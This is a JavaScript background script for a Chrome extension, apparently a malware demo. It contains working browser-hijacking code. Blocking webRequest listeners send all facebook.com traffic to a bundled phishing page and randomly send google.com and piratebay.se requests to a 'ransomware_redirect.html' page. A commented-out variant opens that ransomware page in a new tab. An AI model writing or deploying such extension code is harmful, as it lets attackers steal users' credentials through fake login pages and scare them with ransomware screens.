// called when the user clicks on the browser action.
chrome.browserAction.onClicked.addListener(function(tab) {
    console.log("Browser action, not implemented yet");

    // send a message to the active tab
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        var activeTab = tabs[0];
        chrome.tabs.sendMessage(activeTab.id, {"message": "clicked_browser_action"});
    });
});

// how to redirect
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        if (Math.random() > 0.5) {
            return {redirectUrl: chrome.runtime.getURL("ransomware_redirect.html")};
        }//put here the url you want to redirect the page to
    },
    {
        urls: [
            // put here the list of links that need to react to this event e.g. "*://www.google.com/*"
            "*://www.piratebay.se/*",
            "*://www.google.com/*"
        ],
        types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
    },
    ["blocking"] // makes request synchronous, does not load until function returns
);

// MARK: - Phishing action

chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        return {redirectUrl: chrome.extension.getURL("./components/phishing/phishing.html")};
    },
   {
       urls: [
           "*://www.facebook.com/*"
       ],
       types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
   },
   ["blocking"]
);

// how to open pop up pages
/*chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        console.log("I got you man");
        chrome.tabs.create({ url: "ransomware_redirect.html" }, function(tab) {
            console.log("Opened: " + tab.url);
        });
    },
    {
        urls: [
            "*://www.facebook.com/*"
        ],
        types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
    },
    ["blocking"]
);*/
